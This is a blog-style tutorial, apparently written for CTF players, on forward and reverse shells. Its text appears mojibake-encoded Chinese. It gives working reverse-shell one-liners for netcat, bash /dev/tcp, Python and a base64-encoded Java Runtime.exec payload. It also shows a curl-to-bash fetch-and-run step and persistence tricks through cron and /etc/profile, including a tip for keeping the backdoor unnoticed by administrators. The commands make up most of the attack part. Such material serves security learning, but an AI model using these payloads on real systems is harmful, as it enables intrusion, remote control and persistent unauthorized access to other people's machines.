---
title: å¦‚ä½•åå¼¹shell
date: 2022-03-29 11:15:00
updated: 2022-03-29 11:15:00
tags: [ctf,security]
description: reverse shell
category: Security
---
# æµ…è°ˆå¦‚ä½•åå¼¹shell

## linuxä¸‹å¸¸è§ç½‘ç»œå·¥å…·ğŸ§€

### netcat

netcatä¹Ÿå°±æ˜¯å¹³æ—¶ç”¨çš„ncï¼Œæ˜¯ä¸€ç§åŠŸèƒ½ä¸°å¯Œçš„ç½‘ç»œè°ƒè¯•å’Œè°ƒæŸ¥å·¥å…·ï¼Œå®ƒå¯ä»¥äº§ç”Ÿç”¨æˆ·å¯èƒ½éœ€è¦çš„å‡ ä¹ä»»ä½•ç±»å‹çš„è¿æ¥ï¼Œå¯ä»¥è¿æ¥åˆ°è¿œç¨‹ä¸»æœº`nc  -nvv Targert_IP  Targert_Port`ï¼Œç›‘å¬æœ¬åœ°ä¸»æœº`nc  -l  -p  Local_Port`ï¼Œç«¯å£æ‰«æ`nc  -v  target_IP  target_Port`ã€ç«¯å£ç›‘å¬`nc  -l  -p  local_Port`ã€è¿œç¨‹æ–‡ä»¶ä¼ è¾“`nc  Targert_IP  Targert_Port  <  Targert_File`ã€æ­£å‘shellã€åå‘shellç­‰ç­‰ã€‚

### curl

åœ¨Linuxä¸­curlæ˜¯ä¸€ä¸ªåˆ©ç”¨URLè§„åˆ™åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Œå¯ä»¥è¯´æ˜¯ä¸€æ¬¾å¾ˆå¼ºå¤§çš„httpå‘½ä»¤è¡Œå·¥å…·ã€‚å®ƒæ”¯æŒæ–‡ä»¶çš„ä¸Šä¼ å’Œä¸‹è½½ï¼Œæ˜¯ç»¼åˆä¼ è¾“å·¥å…·ï¼Œè¿™ä¸ªå·¥å…·å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨æœåŠ¡å™¨ä¸Šå¾ˆå¥½çš„æ¨¡æ‹Ÿhttpçš„è¡Œä¸ºã€‚

### wget

wgetæ˜¯ä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„å·¥å…·ï¼Œå®ƒç”¨åœ¨å‘½ä»¤è¡Œä¸‹ã€‚å¯¹äºLinuxç”¨æˆ·æ˜¯å¿…ä¸å¯å°‘çš„å·¥å…·ï¼Œæˆ‘ä»¬ç»å¸¸è¦ä¸‹è½½ä¸€äº›è½¯ä»¶æˆ–ä»è¿œç¨‹æœåŠ¡å™¨æ¢å¤å¤‡ä»½åˆ°æœ¬åœ°æœåŠ¡å™¨ã€‚

### curlå’Œwgetçš„åŒºåˆ«

wgetæ˜¯ä¸ªä¸“èŒçš„ä¸‹è½½åˆ©å™¨ï¼Œç®€å•ï¼Œä¸“ä¸€ï¼Œæè‡´ï¼›è€Œcurlå¯ä»¥ä¸‹è½½ï¼Œä½†æ˜¯é•¿é¡¹ä¸åœ¨äºä¸‹è½½ï¼Œè€Œåœ¨äºæ¨¡æ‹Ÿæäº¤webæ•°æ®ï¼ŒPOST/GETè¯·æ±‚ï¼Œè°ƒè¯•ç½‘é¡µï¼Œç­‰ç­‰ã€‚åœ¨ä¸‹è½½ä¸Šï¼Œä¹Ÿå„æœ‰æ‰€é•¿ï¼Œwgetå¯ä»¥é€’å½’ï¼Œæ”¯æŒæ–­ç‚¹ï¼›è€Œcurlæ”¯æŒURLä¸­åŠ å…¥å˜é‡ï¼Œå› æ­¤å¯ä»¥æ‰¹é‡ä¸‹è½½ã€‚ä¸ªäººç”¨é€”ä¸Šï¼Œæˆ‘ç»å¸¸ç”¨wgetæ¥ä¸‹è½½æ–‡ä»¶ï¼ŒåŠ  -cé€‰é¡¹ä¸æ€•æ–­ç½‘ï¼›ä½¿ç”¨curl æ¥è·Ÿç½‘ç«™çš„API äº¤äº’ï¼Œç®€ä¾¿æ¸…æ™°ã€‚

#### ping

pingå‘½ä»¤æœ¬èº«å¤„äºåº”ç”¨å±‚ï¼Œç›¸å½“äºä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå®ƒç›´æ¥ä½¿ç”¨ç½‘ç»œå±‚çš„ICMPåè®®ï¼Œpingç”¨æ¥æ£€æŸ¥ç½‘ç»œæ˜¯å¦é€šç•…æˆ–è€…ç½‘ç»œè¿æ¥é€Ÿåº¦çš„å‘½ä»¤ã€‚

### telnet

telnetåè®®æ˜¯TCP/IPåè®®æ—çš„å…¶ä¸­ä¹‹ä¸€ï¼Œæ˜¯Internetè¿œç«¯ç™»å½•æœåŠ¡çš„æ ‡å‡†åè®®å’Œä¸»è¦æ–¹å¼ï¼Œå¸¸ç”¨äºç½‘é¡µæœåŠ¡å™¨çš„è¿œç«¯æ§åˆ¶ï¼Œå¯ä¾›ä½¿ç”¨è€…åœ¨æœ¬åœ°ä¸»æœºæ‰§è¡Œè¿œç«¯ä¸»æœºä¸Šçš„å·¥ä½œã€‚telneté€šå¸¸æ˜¯ç”¨æ¥æ¢æµ‹æŒ‡å®šipæ˜¯å¦å¼€æ”¾æŒ‡å®šç«¯å£ã€‚

### ssh

ç®€å•æ¥ä¹¦,ssh å’Œ telnet æ˜¯å®ç°ç›¸åŒçš„åŠŸèƒ½ , sshä¸­ æ•°æ®æ˜¯ç»è¿‡åŠ å¯†çš„,æ˜¯å®‰å…¨çš„ , è€Œ Telnetæ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œssh æ˜¯åŠ å¯†çš„ï¼ŒåŸºäº SSL ã€‚

## æ­£å‘shellå¦‚ä½•è¿æ¥

å¦‚æœå®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨ç«¯ï¼Œæƒ³è¦è·å–æœåŠ¡å™¨ç«¯çš„shellï¼Œé‚£ä¹ˆç§°ä¸ºæ­£å‘shellã€‚

**ç›®æ ‡ä¸»æœºï¼š**

å‘½ä»¤ï¼š`nc  -lvp  Targert_Port  -e  /bin/sh`

![image-20220329101019243](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329101019243.png)

**æœ¬åœ°ä¸»æœºï¼š**

å‘½ä»¤ï¼š`nc  Targert_IP  Targert_Port`

![image-20220329101103804](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329101103804.png)

## ä»€ä¹ˆæ˜¯åå¼¹shell

>
>
>å‚è€ƒ:
>
><https://xz.aliyun.com/t/9488>
>
><https://zhuanlan.zhihu.com/p/138393396>

åå¼¹shellï¼ˆreverse shellï¼‰ï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP/UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚reverse shellä¸telnetï¼Œsshç­‰æ ‡å‡†shellå¯¹åº”ï¼Œæœ¬è´¨ä¸Šæ˜¯ç½‘ç»œæ¦‚å¿µçš„å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è§’è‰²åè½¬ã€‚

ä¸¾ä¾‹ï¼šå‡è®¾æˆ‘ä»¬æ”»å‡»äº†ä¸€å°æœºå™¨ï¼Œæ‰“å¼€äº†è¯¥æœºå™¨çš„ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…åœ¨è‡ªå·±çš„æœºå™¨å»è¿æ¥ç›®æ ‡æœºå™¨ï¼ˆç›®æ ‡ipï¼šç›®æ ‡æœºå™¨ç«¯å£ï¼‰ï¼Œè¿™æ˜¯æ¯”è¾ƒå¸¸è§„çš„å½¢å¼ï¼Œæˆ‘ä»¬å«åšæ­£å‘è¿æ¥ã€‚è¿œç¨‹æ¡Œé¢ã€webæœåŠ¡ã€sshã€telnetç­‰ç­‰éƒ½æ˜¯æ­£å‘è¿æ¥ã€‚é‚£ä¹ˆä»€ä¹ˆæƒ…å†µä¸‹æ­£å‘è¿æ¥ä¸èƒ½ç”¨äº†å‘¢ï¼Ÿ

æœ‰å¦‚ä¸‹æƒ…å†µï¼š

1.æŸå®¢æˆ·æœºä¸­äº†ä½ çš„ç½‘é©¬ï¼Œä½†æ˜¯å®ƒåœ¨å±€åŸŸç½‘å†…ï¼Œä½ ç›´æ¥è¿æ¥ä¸äº†ã€‚

2.ç›®æ ‡æœºå™¨çš„ipåŠ¨æ€æ”¹å˜ï¼Œä½ ä¸èƒ½æŒç»­æ§åˆ¶ã€‚

3.ç”±äºé˜²ç«å¢™ç­‰é™åˆ¶ï¼Œå¯¹æ–¹æœºå™¨åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚ã€‚

4.å¯¹äºç—…æ¯’ï¼Œæœ¨é©¬ï¼Œå—å®³è€…ä»€ä¹ˆæ—¶å€™èƒ½ä¸­æ‹›ï¼Œå¯¹æ–¹çš„ç½‘ç»œç¯å¢ƒæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆæ—¶å€™å¼€å…³æœºç­‰æƒ…å†µéƒ½æ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥å»ºç«‹ä¸€ä¸ªæœåŠ¡ç«¯è®©æ¶æ„ç¨‹åºä¸»åŠ¨è¿æ¥ï¼Œæ‰æ˜¯ä¸Šç­–ã€‚

é‚£ä¹ˆåå¼¹å°±å¾ˆå¥½ç†è§£äº†ï¼Œæ”»å‡»è€…æŒ‡å®šæœåŠ¡ç«¯ï¼Œå—å®³è€…ä¸»æœºä¸»åŠ¨è¿æ¥æ”»å‡»è€…çš„æœåŠ¡ç«¯ç¨‹åºï¼Œå°±å«åå¼¹è¿æ¥ã€‚

åå¼¹shellçš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œé‚£å…·ä½“è¦ç”¨å“ªç§æ–¹å¼è¿˜éœ€è¦æ ¹æ®ç›®æ ‡ä¸»æœºçš„ç¯å¢ƒæ¥ç¡®å®šï¼Œæ¯”å¦‚ç›®æ ‡ä¸»æœºä¸Šå¦‚æœå®‰è£…æœ‰netcatï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨netcatåå¼¹shellï¼Œå¦‚æœå…·æœ‰pythonç¯å¢ƒï¼Œé‚£æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pythonåå¼¹shellã€‚å¦‚æœå…·æœ‰phpç¯å¢ƒï¼Œé‚£æˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpåå¼¹shellã€‚

## å¼¹shellçš„æ–¹å¼

### netcat

æ”»å‡»æœºå¼€å¯ç›‘å¬:`nc -lvp Target_Port`

-lvpä¸­læŒ‡ç›‘å¬ï¼ŒvæŒ‡è¾“å‡ºäº¤äº’è¿‡ç¨‹ï¼Œpä¸ºæŒ‡å®šç«¯å£

é¶æœºè¿æ¥æ”»å‡»æœº:`nc Target_IP Target_Port -e /bin/bash`

![image-20220329104342323](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329104342323.png)

![image-20220329104621670](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329104621670.png)

### Bash

Bashåå¼¹shellçš„æ–¹æ³•éå¸¸å¥½ç”¨ï¼Œé¢˜ç›®çš„æœåŠ¡å™¨ç¯å¢ƒå¯èƒ½æ²¡æœ‰nc,ä½†æ˜¯ä¸€å®šä¼šæœ‰bashã€‚

åŒæ ·çš„æˆ‘ä»¬è¿˜æ˜¯ç”¨nc -lvp Target_Portåœ¨æ”»å‡»æœºçš„ç«¯å£å¼€å¯ç›‘å¬ï¼Œ`nc -lvp Target_Port`è¿™æ¬¡æˆ‘ä»¬ä½¿ç”¨Bashç»“åˆé‡å®šå‘æ¥åå¼¹shell

`bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1`æˆ–è€…`bash -c "bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1"`ï¼Œæ¨èä½¿ç”¨åè€…ï¼Œä½¿ç”¨å‰è€…å¼¹shell,å½“å‘½ä»¤åœ¨æœåŠ¡ç«¯shellä¸­æ‰§è¡Œæ—¶å¯èƒ½å­˜åœ¨/bin/shçš„è½¯è¿æ¥å¹¶ä¸æŒ‡å‘bashçš„é—®é¢˜ï¼Œå¯¼è‡´æŠ¥é”™`/bin/sh: 1:Syntax error:Bad fd number`ã€‚

bash -i äº§ç”Ÿbashäº¤äº’ç¯å¢ƒ >& å°†è”åˆç¬¦å·å‰åå†…å®¹ç»“åˆï¼Œé‡å®šå‘ç»™åè€…ï¼Œ/dev/tcp/Target_IP/Target_Portè®©ç›®æ ‡ä¸»æœºå‘èµ·ä¸æ”»å‡»æœºåœ¨Target_Portä¸Šçš„TCPè¿æ¥ï¼Œ0>&1å°†æ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡ºçš„å†…å®¹ç›¸ç»“åˆï¼Œé‡å®šå‘ç»™å‰é¢æ ‡å‡†è¾“å‡ºçš„å†…å®¹ã€‚

Bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒå’Œæœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸æ”»å‡»æœºç«¯å£å»ºç«‹çš„è¿æ¥ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ªTCP ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªBashåå¼¹ç¯å¢ƒã€‚

![image-20220329105826704](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329105826704.png)

![image-20220329110013286](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329110013286.png)

### Pythonè„šæœ¬åå¼¹shell

åŒæ ·çš„æˆ‘ä»¬è¿˜æ˜¯åœ¨æ”»å‡»æœºå¼€å§‹ç«¯å£ç›‘å¬ï¼Œ`nc -lvp Target_Port`

åœ¨é¶æœºä¸Šæ‰§è¡Œ`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Target_IP",Target_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

### Others

åå¼¹shellçš„æ–¹å¼å¾ˆå¤šï¼Œncå’Œbashæ˜¯æ¯”è¾ƒå¸¸è§çš„æ–¹å¼ï¼Œå…¶ä»–è¿˜æœ‰Telnetï¼ŒSocatç­‰å·¥å…·å¯ä»¥åå¼¹shellï¼Œæˆ–è€…å†™ä¸ªpythonï¼Œphpç­‰è„šæœ¬ä¹Ÿå¯ä»¥åå¼¹shellï¼Œæ¯”è¾ƒçç¢çš„å†…å®¹å…·ä½“é‡åˆ°äº†å†æŸ¥å³å¯ã€‚

### ä¸€äº›å°æŠ€å·§

å› ä¸ºæœ‰æ—¶å€™è¾¾æˆåˆ©ç”¨çš„æ–¹å¼å¯èƒ½æ¯”è¾ƒé—´æ¥ï¼Œè¿™äº›æŠ€å·§å¯ä»¥åœ¨ä¸åŒçš„æƒ…å¢ƒä¸‹è¾¾æˆåå¼¹shellçš„ä½œç”¨ã€‚

#### Curlåå¼¹shell

ç®€å•æ¥è¯´å°±æ˜¯å°†Bashé‡å®šå‘è¿™ä¸€å¥å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œè®©é¶æœºç”¨curlä¸‹è½½è¿™ä¸ªæ–‡ä»¶å¹¶ä¸”æ‰§è¡Œï¼Œè¾¾åˆ°ç”¨Bashé‡å®šå‘ç›¸åŒçš„æ•ˆæœ

é¦–å…ˆï¼Œåœ¨æ”»å‡»è€…vpsçš„webç›®å½•é‡Œé¢åˆ›å»ºä¸€ä¸ªindexæ–‡ä»¶ï¼ˆindex.phpæˆ–index.htmlï¼‰ï¼Œå†…å®¹å¦‚ä¸‹ï¼š

`bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1`æˆ–è€…`bash -c "bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1"`ï¼Œè€Œjavaçš„RCEéœ€è¦ç”¨base64ç¼–ç ï¼ŒPayload:`Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}");`

ç„¶ååœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œå¦‚ä¸‹ï¼Œå³å¯åå¼¹shell

`curl Target_IP|bash`

#### å°†åå¼¹shellçš„å‘½ä»¤å†™å…¥å®šæ—¶ä»»åŠ¡

æˆ‘ä»¬å¯ä»¥åœ¨ç›®æ ‡ä¸»æœºçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶ä¸­å†™å…¥ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬ï¼Œä½†æ˜¯å‰ææ˜¯æˆ‘ä»¬å¿…é¡»è¦çŸ¥é“ç›®æ ‡ä¸»æœºå½“å‰çš„ç”¨æˆ·åæ˜¯å“ªä¸ªã€‚å› ä¸ºæˆ‘ä»¬çš„åå¼¹shellå‘½ä»¤æ˜¯è¦å†™åœ¨ `/var/spool/cron/[crontabs]/<username>` å†…çš„ï¼Œæ‰€ä»¥å¿…é¡»è¦çŸ¥é“è¿œç¨‹ä¸»æœºå½“å‰çš„ç”¨æˆ·åã€‚å¦åˆ™å°±ä¸èƒ½ç”Ÿæ•ˆã€‚

å®šæ—¶ä»»åŠ¡çš„ç†å¿µå°±æ˜¯æ¯éš”ä¸€æ®µæ—¶é—´å‘é€shellï¼Œä»¥ä¸‹ä¸ºæ¯éš”1åˆ†é’Ÿå‘é€shell

`*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/Target_IP/Target_Port 0>&1`

#### å°†åå¼¹shellçš„å‘½ä»¤å†™å…¥/etc/profileæ–‡ä»¶

å°†åå¼¹shellçš„å‘½å†™å…¥/etc/profileæ–‡ä»¶ä¸­ï¼Œ/etc/profileä¸­çš„å†…å®¹ä¼šåœ¨ç”¨æˆ·æ‰“å¼€bashçª—å£æ—¶æ‰§è¡Œã€‚

`/bin/bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1 &`

 æœ€åé¢é‚£ä¸ª&ä¸ºçš„æ˜¯é˜²æ­¢ç®¡ç†å‘˜æ— æ³•è¾“å…¥å‘½ä»¤
